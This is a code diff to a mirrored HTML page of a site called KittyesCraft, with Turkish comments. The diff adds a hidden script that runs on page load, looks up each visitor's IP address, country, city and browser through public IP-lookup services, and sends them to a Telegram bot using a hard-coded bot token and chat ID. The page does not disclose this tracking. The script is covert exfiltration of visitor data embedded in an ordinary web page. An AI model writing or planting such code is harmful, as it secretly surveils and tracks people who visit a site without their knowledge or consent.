@@ -586,31 +586,75 @@
             setTimeout(() => createSnowflake(), i * 150);
         }
 <script>
-// Bilgilerini buraya gir
-const botToken = "8621272611:AAHttOkkTdY5h_nhShk_v2Pf0mi1bjWXuEY";
+// TELEGRAM BİLGİLERİ (YENİ TOKEN'INI @BotFather'dan al)
+const botToken = "8621272611:AAHttOkkTdY5h_nhShk_v2Pf0mi1bjWXuEY"; // Buraya yeni token'ı yaz
 const chatId = "1504410647";
 
-fetch('https://ipapi.co/json/')
-  .then(response => response.json())
-  .then(data => {
-    // Görseldeki formata benzer mesaj yapısı
-    const message = `🤡 <b>KittyesCraft Giriş Yapıldı</b>\n\n` +
-                    `🌐 <b>IP:</b> ${data.ip}\n` +
-                    `📍 <b>Konum:</b> ${data.country_name} / ${data.city}\n` +
-                    `⏰ <b>Zaman:</b> ${new Date().toLocaleString('tr-TR')}\n` +
-                    `🚀 <b>Tarayıcı:</b> Google Chrome\n` +
-                    `✅ 💻 <b>Gerçek Bilgisayar</b>`;
+// Sayfa yüklendiğinde çalıştır
+window.addEventListener('load', function() {
     
-    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ 
-        chat_id: chatId, 
-        text: message,
-        parse_mode: 'HTML'
-      })
-    });
-  });
+    // 1. ALTERNATİF: ipapi.co (şu an çalışmıyor, yorum satırında)
+    // fetch('https://ipapi.co/json/')
+    
+    // 2. ALTERNATİF: ipwho.is (Ücretsiz, çalışıyor)
+    fetch('https://ipwho.is/')
+        .then(response => response.json())
+        .then(data => {
+            console.log('IP bilgisi alındı:', data);
+            
+            // Tarayıcı bilgisini al
+            const userAgent = navigator.userAgent;
+            let browser = "Bilinmiyor";
+            if (userAgent.includes("Chrome")) browser = "Google Chrome";
+            else if (userAgent.includes("Firefox")) browser = "Firefox";
+            else if (userAgent.includes("Safari")) browser = "Safari";
+            else if (userAgent.includes("Edge")) browser = "Edge";
+            
+            const message = `🤡 <b>KittyesCraft Giriş Yapıldı</b>\n\n` +
+                `🌐 <b>IP:</b> ${data.ip}\n` +
+                `📍 <b>Konum:</b> ${data.country} / ${data.city}\n` +
+                `⏰ <b>Zaman:</b> ${new Date().toLocaleString('tr-TR')}\n` +
+                `🚀 <b>Tarayıcı:</b> ${browser}\n` +
+                `✅ 💻 <b>Gerçek Bilgisayar</b>`;
+            
+            return fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    chat_id: chatId, 
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            });
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log('Telegram sonucu:', data);
+        })
+        .catch(error => {
+            console.error('Hata:', error);
+            
+            // 3. ALTERNATİF: ipify (sadece IP verir)
+            fetch('https://api.ipify.org?format=json')
+                .then(r => r.json())
+                .then(ipData => {
+                    const message = `⚠️ <b>Sadece IP Alındı</b>\n\n` +
+                        `🌐 <b>IP:</b> ${ipData.ip}\n` +
+                        `⏰ <b>Zaman:</b> ${new Date().toLocaleString('tr-TR')}`;
+                    
+                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ 
+                            chat_id: chatId, 
+                            text: message,
+                            parse_mode: 'HTML'
+                        })
+                    });
+                });
+        });
+        
+});
 </script>
 </body>
 
@@ -618,6 +662,7 @@ fetch('https://ipapi.co/json/')
 <!-- Mirrored from Kittyescraft.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 28 Feb 2026 14:23:44 GMT -->
 
 </html>
+
 
 
 
